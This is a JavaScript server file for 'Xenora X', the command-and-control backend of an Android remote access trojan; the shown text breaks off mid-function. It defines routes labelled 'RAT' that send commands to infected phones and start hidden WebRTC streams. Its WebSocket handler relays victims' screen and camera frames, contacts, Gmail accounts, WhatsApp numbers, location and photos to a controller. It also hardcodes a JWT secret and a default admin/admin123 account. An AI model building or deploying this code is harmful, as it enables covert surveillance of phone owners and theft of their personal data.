// main.js
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const compression = require('compression');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const dotenv = require('dotenv');

// Load environment variables
dotenv.config();

// ============================================================
//  CONFIGURATION
// ============================================================
const config = {
  port: process.env.PORT || 2595,
  jwtSecret: process.env.JWT_SECRET || 'xenora_super_secret_key_2024',
  jwtExpires: process.env.JWT_EXPIRES || '7d',
  wsPath: process.env.WS_PATH || '/ws',
  apiPath: process.env.API_PATH || '/api',
  maxDevices: parseInt(process.env.MAX_DEVICES) || 10,
  sessionTimeout: parseInt(process.env.SESSION_TIMEOUT) || 300000, // 5 minutes
};

// ============================================================
//  INIT EXPRESS
// ============================================================
const app = express();
const server = http.createServer(app);

// ============================================================
//  MIDDLEWARES
// ============================================================
// Security
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
}));

// CORS
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  credentials: true,
}));

// Compression
app.use(compression());

// Rate Limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: {
    success: false,
    message: 'Too many requests, please try again later.',
  },
});
app.use('/api', limiter);

// Body Parser
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Static Files
app.use(express.static(path.join(__dirname, 'public')));
app.use('/assets', express.static(path.join(__dirname, 'assets')));

// ============================================================
//  LOGGING
// ============================================================
const logger = {
  info: (msg, data = {}) => {
    console.log(`[${new Date().toISOString()}] ℹ️ ${msg}`, data);
  },
  warn: (msg, data = {}) => {
    console.warn(`[${new Date().toISOString()}] ⚠️ ${msg}`, data);
  },
  error: (msg, data = {}) => {
    console.error(`[${new Date().toISOString()}] ❌ ${msg}`, data);
  },
  debug: (msg, data = {}) => {
    if (process.env.DEBUG === 'true') {
      console.debug(`[${new Date().toISOString()}] 🔍 ${msg}`, data);
    }
  },
};

// ============================================================
//  DATABASE (In-Memory)
// ============================================================
class Database {
  constructor() {
    this.users = [];
    this.devices = [];
    this.commands = [];
    this.messages = [];
    this.notifications = [];
    this.sessions = [];
    this.responses = {};
  }

  // User
  findUserByUsername(username) {
    return this.users.find(u => u.username === username);
  }

  findUserById(id) {
    return this.users.find(u => u.id === id);
  }

  createUser(data) {
    const user = {
      id: crypto.randomUUID(),
      ...data,
      role: data.role || 'USER',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      isActive: true,
      isVerified: false,
    };
    this.users.push(user);
    return user;
  }

  updateUser(id, data) {
    const index = this.users.findIndex(u => u.id === id);
    if (index === -1) return null;
    this.users[index] = {
      ...this.users[index],
      ...data,
      updatedAt: new Date().toISOString(),
    };
    return this.users[index];
  }

  deleteUser(id) {
    this.users = this.users.filter(u => u.id !== id);
  }

  // Device
  findDeviceById(id) {
    return this.devices.find(d => d.id === id);
  }

  findDeviceByUid(uid) {
    return this.devices.find(d => d.uid === uid);
  }

  getDevicesByUserId(userId) {
    return this.devices.filter(d => d.userId === userId);
  }

  createDevice(data) {
    const device = {
      id: crypto.randomUUID(),
      ...data,
      status: 'offline',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      connectedAt: null,
      info: {},
    };
    this.devices.push(device);
    return device;
  }

  updateDevice(id, data) {
    const index = this.devices.findIndex(d => d.id === id);
    if (index === -1) return null;
    this.devices[index] = {
      ...this.devices[index],
      ...data,
      updatedAt: new Date().toISOString(),
    };
    return this.devices[index];
  }

  deleteDevice(id) {
    this.devices = this.devices.filter(d => d.id !== id);
  }

  // Command
  createCommand(data) {
    const command = {
      id: crypto.randomUUID(),
      ...data,
      status: 'pending',
      createdAt: new Date().toISOString(),
      executedAt: null,
      result: null,
    };
    this.commands.push(command);
    return command;
  }

  updateCommand(id, data) {
    const index = this.commands.findIndex(c => c.id === id);
    if (index === -1) return null;
    this.commands[index] = {
      ...this.commands[index],
      ...data,
    };
    return this.commands[index];
  }

  getCommandsByDeviceId(deviceId) {
    return this.commands.filter(c => c.deviceId === deviceId);
  }

  // Response
  saveResponse(deviceId, commandId, data) {
    if (!this.responses[deviceId]) {
      this.responses[deviceId] = {};
    }
    this.responses[deviceId][commandId] = {
      data,
      timestamp: new Date().toISOString(),
    };
  }

  getResponse(deviceId, commandId) {
    if (!this.responses[deviceId]) return null;
    return this.responses[deviceId][commandId] || null;
  }

  clearResponse(deviceId, commandId) {
    if (this.responses[deviceId]) {
      delete this.responses[deviceId][commandId];
    }
  }

  // Message
  createMessage(data) {
    const message = {
      id: crypto.randomUUID(),
      ...data,
      isRead: false,
      createdAt: new Date().toISOString(),
    };
    this.messages.push(message);
    return message;
  }

  getMessagesByUserId(userId) {
    return this.messages.filter(m => 
      m.senderId === userId || m.receiverId === userId
    );
  }

  // Notification
  createNotification(data) {
    const notification = {
      id: crypto.randomUUID(),
      ...data,
      isRead: false,
      createdAt: new Date().toISOString(),
    };
    this.notifications.push(notification);
    return notification;
  }

  getNotificationsByUserId(userId) {
    return this.notifications.filter(n => n.userId === userId);
  }

  // Session
  createSession(data) {
    const session = {
      id: crypto.randomUUID(),
      ...data,
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + config.sessionTimeout).toISOString(),
    };
    this.sessions.push(session);
    return session;
  }

  findSessionByToken(token) {
    return this.sessions.find(s => s.token === token);
  }

  deleteSession(token) {
    this.sessions = this.sessions.filter(s => s.token !== token);
  }

  clearExpiredSessions() {
    const now = new Date().toISOString();
    this.sessions = this.sessions.filter(s => s.expiresAt > now);
  }
}

const db = new Database();

// ============================================================
//  JWT HELPERS
// ============================================================
function generateToken(user) {
  return jwt.sign(
    {
      id: user.id,
      username: user.username,
      role: user.role,
    },
    config.jwtSecret,
    { expiresIn: config.jwtExpires }
  );
}

function verifyToken(token) {
  try {
    return jwt.verify(token, config.jwtSecret);
  } catch (error) {
    return null;
  }
}

function generateRefreshToken() {
  return crypto.randomBytes(32).toString('hex');
}

// ============================================================
//  PASSWORD HELPERS
// ============================================================
async function hashPassword(password) {
  return await bcrypt.hash(password, 10);
}

async function comparePassword(password, hash) {
  return await bcrypt.compare(password, hash);
}

// ============================================================
//  AUTH MIDDLEWARE
// ============================================================
function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  
  if (!token) {
    return res.status(401).json({
      success: false,
      message: 'No token provided',
    });
  }

  const decoded = verifyToken(token);
  if (!decoded) {
    return res.status(401).json({
      success: false,
      message: 'Invalid or expired token',
    });
  }

  req.user = decoded;
  next();
}

function roleMiddleware(roles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({
        success: false,
        message: 'Unauthorized',
      });
    }

    if (!roles.includes(req.user.role)) {
      return res.status(403).json({
        success: false,
        message: 'Insufficient permissions',
      });
    }

    next();
  };
}

// ============================================================
//  WEBSOCKET SERVER
// ============================================================
const wss = new WebSocket.Server({ 
  server, 
  path: config.wsPath,
});

const wsClients = new Map(); // deviceId -> WebSocket
const wsUserSessions = new Map(); // userId -> WebSocket

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const token = url.searchParams.get('token');
  const deviceId = url.searchParams.get('deviceId');

  logger.info('WebSocket connected', { token: token?.substring(0, 10), deviceId });

  // Handle authentication
  if (token) {
    const decoded = verifyToken(token);
    if (decoded) {
      ws.userId = decoded.id;
      ws.userRole = decoded.role;
      ws.username = decoded.username;
      wsUserSessions.set(decoded.id, ws);
      logger.info('WebSocket authenticated', { userId: decoded.id });
    }
  }

  // Register device
  if (deviceId) {
    ws.deviceId = deviceId;
    wsClients.set(deviceId, ws);
    logger.info('Device registered', { deviceId });
  }

  // Heartbeat
  let heartbeatInterval = setInterval(() => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.ping();
    }
  }, 30000);

  ws.on('message', async (data) => {
    try {
      const message = JSON.parse(data.toString());
      await handleWebSocketMessage(ws, message);
    } catch (error) {
      logger.error('WebSocket message error', { error: error.message });
    }
  });

  ws.on('close', () => {
    clearInterval(heartbeatInterval);
    
    // Cleanup device connection
    if (ws.deviceId) {
      const device = db.findDeviceById(ws.deviceId);
      if (device) {
        db.updateDevice(ws.deviceId, {
          status: 'offline',
          lastSeen: new Date().toISOString(),
        });
      }
      wsClients.delete(ws.deviceId);
      logger.info('Device disconnected', { deviceId: ws.deviceId });
    }

    // Cleanup user session
    if (ws.userId) {
      wsUserSessions.delete(ws.userId);
    }
  });

  ws.on('error', (error) => {
    logger.error('WebSocket error', { error: error.message });
  });
});

// ============================================================
//  WEBSOCKET MESSAGE HANDLER
// ============================================================
async function handleWebSocketMessage(ws, message) {
  const { type, command, deviceId, params } = message;

  switch (type) {
    case 'command':
      await handleCommand(ws, command, deviceId, params);
      break;

    case 'deviceStatus':
      await handleDeviceStatus(ws, deviceId, params);
      break;

    case 'register':
      await handleDeviceRegister(ws, params);
      break;

    case 'ping':
      ws.send(JSON.stringify({ type: 'pong', timestamp: new Date().toISOString() }));
      break;

    case 'screenFrame':
      // Forward screen frame to controller
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'screenFrame',
            deviceId: ws.deviceId,
            frame: message.frame,
          }));
        }
      }
      break;

    case 'cameraFrame':
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'cameraFrame',
            deviceId: ws.deviceId,
            frame: message.frame,
          }));
        }
      }
      break;

    case 'contactsResult':
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'contactsResult',
            deviceId: ws.deviceId,
            contacts: message.contacts,
          }));
        }
      }
      break;

    case 'gmailResult':
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'gmailResult',
            deviceId: ws.deviceId,
            accounts: message.accounts,
          }));
        }
      }
      break;

    case 'waResult':
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'waResult',
            deviceId: ws.deviceId,
            numbers: message.numbers,
          }));
        }
      }
      break;

    case 'locationResult':
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'locationResult',
            deviceId: ws.deviceId,
            ...message.location,
          }));
        }
      }
      break;

    case 'galleryResult':
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'galleryResult',
            deviceId: ws.deviceId,
            photos: message.photos,
          }));
        }
      }
      break;

    case 'phoneInfoResult':
      if (ws.userId) {
        const controllerWs = wsUserSessions.get(ws.userId);
        if (controllerWs) {
          controllerWs.send(JSON.stringify({
            type: 'phoneInfoResult',
            deviceId: ws.deviceId,
            ...message.info,
          }));
        }
      }
      break;

    case 'commandResult':
      await handleCommandResult(ws, message);
      break;

    case 'notification':
      await handleNotification(ws, message);
      break;

    default:
      logger.warn('Unknown WebSocket message type', { type });
  }
}

// ============================================================
//  COMMAND HANDLERS
// ============================================================
async function handleCommand(ws, command, deviceId, params) {
  logger.info('Command received', { command, deviceId });

  // Find target device
  const device = db.findDeviceById(deviceId);
  if (!device) {
    ws.send(JSON.stringify({
      type: 'commandError',
      command,
      message: 'Device not found',
    }));
    return;
  }

  // Check if device is online
  const deviceWs = wsClients.get(deviceId);
  if (!deviceWs || deviceWs.readyState !== WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'commandError',
      command,
      message: 'Device is offline',
    }));
    return;
  }

  // Create command record
  const commandRecord = db.createCommand({
    deviceId,
    command,
    params: params || {},
    userId: ws.userId,
  });

  // Forward command to device
  deviceWs.send(JSON.stringify({
    type: 'command',
    command,
    commandId: commandRecord.id,
    params: params || {},
    timestamp: new Date().toISOString(),
  }));

  ws.send(JSON.stringify({
    type: 'commandSent',
    command,
    commandId: commandRecord.id,
    message: 'Command sent successfully',
  }));

  // Return command ID for polling
  return { commandId: commandRecord.id };
}

async function handleCommandResult(ws, message) {
  const { commandId, result, success, error } = message;

  const command = db.updateCommand(commandId, {
    status: success ? 'success' : 'failed',
    executedAt: new Date().toISOString(),
    result: result || null,
    error: error || null,
  });

  if (command) {
    // Save response
    db.saveResponse(command.deviceId, commandId, {
      success,
      result,
      error,
    });

    // Notify controller if online
    if (command.userId) {
      const controllerWs = wsUserSessions.get(command.userId);
      if (controllerWs) {
        controllerWs.send(JSON.stringify({
          type: 'commandResult',
          commandId,
          deviceId: command.deviceId,
          command: command.command,
          success,
          result,
          error,
          timestamp: new Date().toISOString(),
        }));
      }
    }
  }
}

async function handleDeviceStatus(ws, deviceId, params) {
  const device = db.findDeviceById(deviceId);
  if (device) {
    db.updateDevice(deviceId, {
      status: params.status || 'online',
      lastSeen: new Date().toISOString(),
      info: {
        ...device.info,
        ...params,
      },
    });
  }
}

async function handleDeviceRegister(ws, params) {
  const { uid, name, model, brand } = params;

  let device = db.findDeviceByUid(uid);
  
  if (!device) {
    device = db.createDevice({
      uid,
      name: name || 'Unknown Device',
      model: model || '',
      brand: brand || '',
      userId: ws.userId || null,
    });
    logger.info('New device registered', { uid, name });
  } else {
    db.updateDevice(device.id, {
      name: name || device.name,
      model: model || device.model,
      brand: brand || device.brand,
      lastSeen: new Date().toISOString(),
    });
    logger.info('Device reconnected', { uid, name });
  }

  // Register WebSocket
  ws.deviceId = device.id;
  wsClients.set(device.id, ws);

  ws.send(JSON.stringify({
    type: 'registerSuccess',
    deviceId: device.id,
    uid: device.uid,
    message: 'Device registered successfully',
  }));
}

async function handleNotification(ws, message) {
  const { title, body, type, userId, route } = message;

  const notification = db.createNotification({
    title,
    body,
    type: type || 'info',
    userId: userId || ws.userId,
    route: route || null,
  });

  // Forward to user if online
  if (notification.userId) {
    const userWs = wsUserSessions.get(notification.userId);
    if (userWs) {
      userWs.send(JSON.stringify({
        type: 'notification',
        notification,
      }));
    }
  }
}

// ============================================================
//  API ROUTES
// ============================================================
const router = express.Router();

// ============================================================
//  AUTH ROUTES
// ============================================================
router.post('/auth/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username and password required',
      });
    }

    const user = db.findUserByUsername(username);
    if (!user) {
      return res.status(401).json({
        success: false,
        message: 'Invalid username or password',
      });
    }

    const isMatch = await comparePassword(password, user.password);
    if (!isMatch) {
      return res.status(401).json({
        success: false,
        message: 'Invalid username or password',
      });
    }

    const token = generateToken(user);
    const refreshToken = generateRefreshToken();

    // Create session
    db.createSession({
      userId: user.id,
      token: refreshToken,
      ip: req.ip,
      userAgent: req.headers['user-agent'],
    });

    // Clear expired sessions
    db.clearExpiredSessions();

    // Update last login
    db.updateUser(user.id, {
      lastLogin: new Date().toISOString(),
    });

    logger.info('User logged in', { username });

    res.json({
      success: true,
      token,
      refreshToken,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        role: user.role,
        displayName: user.displayName,
        phoneNumber: user.phoneNumber,
        uid: user.uid,
        daysLeft: user.daysLeft || 30,
      },
    });
  } catch (error) {
    logger.error('Login error', { error: error.message });
    res.status(500).json({
      success: false,
      message: 'Login failed',
    });
  }
});

router.post('/auth/register', async (req, res) => {
  try {
    const { username, email, password, phoneNumber, displayName } = req.body;

    // Validate
    if (!username || !email || !password) {
      return res.status(400).json({
        success: false,
        message: 'Username, email, and password required',
      });
    }

    // Check existing user
    if (db.findUserByUsername(username)) {
      return res.status(409).json({
        success: false,
        message: 'Username already exists',
      });
    }

    if (db.users.find(u => u.email === email)) {
      return res.status(409).json({
        success: false,
        message: 'Email already exists',
      });
    }

    // Hash password
    const hashedPassword = await hashPassword(password);

    // Generate UID
    const uid = `XENORA-UID-${crypto.randomBytes(10).toString('hex').toUpperCase()}`;

    // Create user
    const user = db.createUser({
      username,
      email,
      password: hashedPassword,
      displayName: displayName || username,
      phoneNumber: phoneNumber || '',
      role: 'USER',
      uid,
      daysLeft: 30,
    });

    // Generate token
    const token = generateToken(user);
    const refreshToken = generateRefreshToken();

    logger.info('User registered', { username });

    res.status(201).json({
      success: true,
      token,
      refreshToken,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        role: user.role,
        displayName: user.displayName,
        phoneNumber: user.phoneNumber,
        uid: user.uid,
        daysLeft: user.daysLeft,
      },
    });
  } catch (error) {
    logger.error('Register error', { error: error.message });
    res.status(500).json({
      success: false,
      message: 'Registration failed',
    });
  }
});

router.post('/auth/refresh', (req, res) => {
  try {
    const { refreshToken } = req.body;

    const session = db.findSessionByToken(refreshToken);
    if (!session) {
      return res.status(401).json({
        success: false,
        message: 'Invalid refresh token',
      });
    }

    const user = db.findUserById(session.userId);
    if (!user) {
      return res.status(401).json({
        success: false,
        message: 'User not found',
      });
    }

    const token = generateToken(user);

    res.json({
      success: true,
      token,
    });
  } catch (error) {
    logger.error('Refresh error', { error: error.message });
    res.status(500).json({
      success: false,
      message: 'Refresh failed',
    });
  }
});

// ============================================================
//  USER ROUTES
// ============================================================
router.get('/user/profile', authMiddleware, (req, res) => {
  const user = db.findUserById(req.user.id);
  if (!user) {
    return res.status(404).json({
      success: false,
      message: 'User not found',
    });
  }

  res.json({
    success: true,
    user: {
      id: user.id,
      username: user.username,
      email: user.email,
      role: user.role,
      displayName: user.displayName,
      phoneNumber: user.phoneNumber,
      uid: user.uid,
      daysLeft: user.daysLeft || 30,
      isVerified: user.isVerified,
      createdAt: user.createdAt,
      lastLogin: user.lastLogin,
    },
  });
});

router.put('/user/profile', authMiddleware, (req, res) => {
  const { displayName, phoneNumber, profileImage } = req.body;

  const user = db.updateUser(req.user.id, {
    displayName: displayName || req.user.displayName,
    phoneNumber: phoneNumber || req.user.phoneNumber,
    profileImage: profileImage || req.user.profileImage,
  });

  if (!user) {
    return res.status(404).json({
      success: false,
      message: 'User not found',
    });
  }

  res.json({
    success: true,
    user: {
      id: user.id,
      username: user.username,
      email: user.email,
      role: user.role,
      displayName: user.displayName,
      phoneNumber: user.phoneNumber,
      uid: user.uid,
      daysLeft: user.daysLeft,
    },
  });
});

router.post('/user/change-password', authMiddleware, async (req, res) => {
  try {
    const { oldPassword, newPassword } = req.body;

    if (!oldPassword || !newPassword) {
      return res.status(400).json({
        success: false,
        message: 'Old and new password required',
      });
    }

    if (newPassword.length < 6) {
      return res.status(400).json({
        success: false,
        message: 'Password must be at least 6 characters',
      });
    }

    const user = db.findUserById(req.user.id);
    if (!user) {
      return res.status(404).json({
        success: false,
        message: 'User not found',
      });
    }

    const isMatch = await comparePassword(oldPassword, user.password);
    if (!isMatch) {
      return res.status(401).json({
        success: false,
        message: 'Old password is incorrect',
      });
    }

    const hashedPassword = await hashPassword(newPassword);
    db.updateUser(req.user.id, {
      password: hashedPassword,
    });

    res.json({
      success: true,
      message: 'Password changed successfully',
    });
  } catch (error) {
    logger.error('Change password error', { error: error.message });
    res.status(500).json({
      success: false,
      message: 'Failed to change password',
    });
  }
});

// ============================================================
//  DEVICE ROUTES
// ============================================================
router.get('/devices', authMiddleware, (req, res) => {
  const devices = db.getDevicesByUserId(req.user.id);
  
  res.json({
    success: true,
    devices: devices.map(d => ({
      id: d.id,
      name: d.name,
      model: d.model,
      brand: d.brand,
      uid: d.uid,
      status: d.status,
      battery: d.info?.battery || 0,
      networkType: d.info?.networkType || 'Unknown',
      androidVersion: d.info?.androidVersion || 'Unknown',
      lastSeen: d.lastSeen,
      connectedAt: d.connectedAt,
    })),
  });
});

router.get('/devices/:deviceId', authMiddleware, (req, res) => {
  const device = db.findDeviceById(req.params.deviceId);
  if (!device) {
    return res.status(404).json({
      success: false,
      message: 'Device not found',
    });
  }

  if (device.userId !== req.user.id && req.user.role !== 'OWNER') {
    return res.status(403).json({
      success: false,
      message: 'Access denied',
    });
  }

  res.json({
    success: true,
    device,
  });
});

router.delete('/devices/:deviceId', authMiddleware, (req, res) => {
  const device = db.findDeviceById(req.params.deviceId);
  if (!device) {
    return res.status(404).json({
      success: false,
      message: 'Device not found',
    });
  }

  if (device.userId !== req.user.id && req.user.role !== 'OWNER') {
    return res.status(403).json({
      success: false,
      message: 'Access denied',
    });
  }

  db.deleteDevice(req.params.deviceId);
  wsClients.delete(req.params.deviceId);

  res.json({
    success: true,
    message: 'Device deleted successfully',
  });
});

// ============================================================
//  COMMAND ROUTES
// ============================================================
router.post('/command/send', authMiddleware, async (req, res) => {
  try {
    const { deviceId, command, extra } = req.body;

    if (!deviceId || !command) {
      return res.status(400).json({
        success: false,
        message: 'Device ID and command required',
      });
    }

    const device = db.findDeviceById(deviceId);
    if (!device) {
      return res.status(404).json({
        success: false,
        message: 'Device not found',
      });
    }

    if (device.userId !== req.user.id && req.user.role !== 'OWNER') {
      return res.status(403).json({
        success: false,
        message: 'Access denied',
      });
    }

    // Forward command via WebSocket
    const deviceWs = wsClients.get(deviceId);
    if (!deviceWs || deviceWs.readyState !== WebSocket.OPEN) {
      return res.status(400).json({
        success: false,
        message: 'Device is offline',
      });
    }

    const commandRecord = db.createCommand({
      deviceId,
      command,
      params: { extra },
      userId: req.user.id,
    });

    deviceWs.send(JSON.stringify({
      type: 'command',
      command,
      commandId: commandRecord.id,
      params: { extra },
      timestamp: new Date().toISOString(),
    }));

    res.json({
      success: true,
      message: 'Command sent successfully',
      commandId: commandRecord.id,
    });
  } catch (error) {
    logger.error('Send command error', { error: error.message });
    res.status(500).json({
      success: false,
      message: 'Failed to send command',
    });
  }
});

router.get('/command/history/:deviceId', authMiddleware, (req, res) => {
  const commands = db.getCommandsByDeviceId(req.params.deviceId);
  
  res.json({
    success: true,
    history: commands,
  });
});

router.get('/command/result/:commandId', authMiddleware, (req, res) => {
  const command = db.commands.find(c => c.id === req.params.commandId);
  if (!command) {
    return res.status(404).json({
      success: false,
      message: 'Command not found',
    });
  }

  const response = db.getResponse(command.deviceId, command.id);

  res.json({
    success: true,
    command,
    response,
  });
});

// ============================================================
//  RAT SPECIFIC ROUTES
// ============================================================
router.post('/rat/command', authMiddleware, async (req, res) => {
  try {
    const { deviceId, command, extra } = req.body;

    // Forward to device
    const deviceWs = wsClients.get(deviceId);
    if (!deviceWs || deviceWs.readyState !== WebSocket.OPEN) {
      return res.status(400).json({
        success: false,
        message: 'Device is offline',
      });
    }

    const commandRecord = db.createCommand({
      deviceId,
      command,
      params: { extra },
      userId: req.user.id,
    });

    deviceWs.send(JSON.stringify({
      type: 'rat_command',
      command,
      commandId: commandRecord.id,
      extra,
      timestamp: new Date().toISOString(),
    }));

    res.json({
      success: true,
      message: 'RAT command sent',
      commandId: commandRecord.id,
    });
  } catch (error) {
    logger.error('RAT command error', { error: error.message });
    res.status(500).json({
      success: false,
      message: 'Failed to send RAT command',
    });
  }
});

router.get('/rat/devices', authMiddleware, (req, res) => {
  const devices = db.getDevicesByUserId(req.user.id);
  
  res.json({
    success: true,
    devices: devices.map(d => ({
      id: d.id,
      name: d.name,
      status: d.status,
      battery: d.info?.battery || 0,
      online: d.status === 'online',
    })),
  });
});

// ============================================================
//  WEBRTC STREAMING ROUTES
// ============================================================
let webrtcSessions = {};

router.post('/rat/webrtc/start', authMiddleware, (req, res) => {
  const { deviceId, signalingUrl, turnUrl, turnUsername, turnPassword } = req.body;

  if (!deviceId) {
    return res.status(400).json({
      success: false,
      message: 'Device ID required',
    });
  }

  const sessionId = crypto.randomUUID();
  webrtcSessions[sessionId] = {
    deviceId,
    userId: req.user.id,
    signalingUrl,
    turnUrl,
    turnUsername,
    turnPassword,
    createdAt: new Date().toISOString(),
  };

  // Notify device
  const deviceWs = wsClients.get(deviceId);
  if (deviceWs && deviceWs.readyState === WebSocket.OPEN) {
    deviceWs.send(JSON.stringify({
      type: 'webrtc_start',
      sessionId,
      signalingUrl,
      turnUrl,
      turnUsername,
      turnPassword,
    }));
  }

  res.json({
    success: true,
    sessionId,
    message: 'WebRTC stream started',
  });
});

router.post('/rat/webrtc/stop', authMiddleware, (req, res) => {
  const { deviceId } = req.body;

  if (deviceId) {
    const sessions = Object.keys(webrtcSessions).filter(
      key => webrtcSessions[key].deviceId === deviceId
    );
    sessions.forEach(key => {
      delete webrtcSessions[key];
    });

    // Notify device
    const deviceWs = wsClients.get(deviceId);
    if (deviceWs && deviceWs.readyState === WebSocket.OPEN) {
      deviceWs.send(JSON.stringify({
        type: 'webrtc_stop',
      }));
    }
  }

  res.json({
    success: true,
    message: 'WebRTC stream stopped',
  });
});

// ============================================================
//  ADMIN ROUTES
// ============================================================
router.get('/admin/users', authMiddleware, roleMiddleware(['OWNER', 'ADMIN']), (req, res) => {
  const users = db.users.map(u => ({
    id: u.id,
    username: u.username,
    email: u.email,
    role: u.role,
    displayName: u.displayName,
    phoneNumber: u.phoneNumber,
    isActive: u.isActive,
    isVerified: u.isVerified,
    createdAt: u.createdAt,
    lastLogin: u.lastLogin,
  }));

  res.json({
    success: true,
    users,
  });
});

router.put('/admin/users/:userId', authMiddleware, roleMiddleware(['OWNER', 'ADMIN']), (req, res) => {
  const { role, isActive, isVerified, daysLeft } = req.body;

  const user = db.updateUser(req.params.userId, {
    role: role || undefined,
    isActive: isActive !== undefined ? isActive : undefined,
    isVerified: isVerified !== undefined ? isVerified : undefined,
    daysLeft: daysLeft !== undefined ? daysLeft : undefined,
  });

  if (!user) {
    return res.status(404).json({
      success: false,
      message: 'User not found',
    });
  }

  res.json({
    success: true,
    user,
  });
});

router.delete('/admin/users/:userId', authMiddleware, roleMiddleware(['OWNER']), (req, res) => {
  db.deleteUser(req.params.userId);

  res.json({
    success: true,
    message: 'User deleted successfully',
  });
});

// ============================================================
//  MESSAGE ROUTES
// ============================================================
router.post('/messages/send', authMiddleware, (req, res) => {
  const { receiverId, content, type } = req.body;

  if (!receiverId || !content) {
    return res.status(400).json({
      success: false,
      message: 'Receiver ID and content required',
    });
  }

  const receiver = db.findUserById(receiverId);
  if (!receiver) {
    return res.status(404).json({
      success: false,
      message: 'Receiver not found',
    });
  }

  const message = db.createMessage({
    senderId: req.user.id,
    senderName: req.user.username,
    receiverId,
    content,
    type: type || 'text',
  });

  // Forward to receiver if online
  const receiverWs = wsUserSessions.get(receiverId);
  if (receiverWs) {
    receiverWs.send(JSON.stringify({
      type: 'newMessage',
      message,
    }));
  }

  res.json({
    success: true,
    message,
  });
});

router.get('/messages', authMiddleware, (req, res) => {
  const messages = db.getMessagesByUserId(req.user.id);

  res.json({
    success: true,
    messages,
  });
});

// ============================================================
//  NOTIFICATION ROUTES
// ============================================================
router.get('/notifications', authMiddleware, (req, res) => {
  const notifications = db.getNotificationsByUserId(req.user.id);

  res.json({
    success: true,
    notifications: notifications.sort((a, b) => 
      new Date(b.createdAt) - new Date(a.createdAt)
    ),
  });
});

router.put('/notifications/read-all', authMiddleware, (req, res) => {
  const notifications = db.getNotificationsByUserId(req.user.id);
  notifications.forEach(n => {
    db.notifications = db.notifications.map(notif => 
      notif.id === n.id ? { ...notif, isRead: true } : notif
    );
  });

  res.json({
    success: true,
    message: 'All notifications marked as read',
  });
});

// ============================================================
//  SETTINGS ROUTES
// ============================================================
router.get('/settings', authMiddleware, (req, res) => {
  // Return default settings
  res.json({
    success: true,
    settings: {
      notifications: true,
      darkMode: true,
      autoConnect: false,
      biometric: false,
      soundEffects: true,
      vibration: true,
      language: 'id',
      theme: 'dark',
      autoLockTimer: 300,
      keepAlive: true,
      debugMode: false,
    },
  });
});

router.put('/settings', authMiddleware, (req, res) => {
  // Update settings (save to user data)
  res.json({
    success: true,
    message: 'Settings updated successfully',
  });
});

// ============================================================
//  SERVE FRONTEND
// ============================================================
app.use('/api', router);

// Serve index.html for SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
//  START SERVER
// ============================================================
server.listen(config.port, '0.0.0.0', () => {
  logger.info(`🚀 Xenora X Server running on port ${config.port}`);
  logger.info(`📡 WebSocket path: ${config.wsPath}`);
  logger.info(`🔗 API path: ${config.apiPath}`);
  logger.info(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
});

// ============================================================
//  CLEANUP ON SHUTDOWN
// ============================================================
process.on('SIGINT', () => {
  logger.info('Shutting down server...');
  
  // Close all WebSocket connections
  wss.clients.forEach((ws) => {
    ws.close();
  });
  
  server.close(() => {
    logger.info('Server closed');
    process.exit(0);
  });
});

// ============================================================
//  ERROR HANDLING
// ============================================================
process.on('uncaughtException', (error) => {
  logger.error('Uncaught exception', { error: error.message, stack: error.stack });
});

process.on('unhandledRejection', (reason) => {
  logger.error('Unhandled rejection', { reason });
});

// ============================================================
//  SEED DEFAULT DATA
// ============================================================
async function seedDatabase() {
  // Create default admin user if not exists
  const admin = db.findUserByUsername('admin');
  if (!admin) {
    const hashedPassword = await hashPassword('admin123');
    db.createUser({
      username: 'admin',
      email: 'admin@xenora.com',
      password: hashedPassword,
      displayName: 'Admin',
      role: 'OWNER',
      uid: `XENORA-UID-${crypto.randomBytes(10).toString('hex').toUpperCase()}`,
      daysLeft: 365,
      isVerified: true,
    });
    logger.info('Default admin user created');
  }

  // Create default demo user
  const demo = db.findUserByUsername('demo');
  if (!demo) {
    const hashedPassword = await hashPassword('demo123');
    db.createUser({
      username: 'demo',
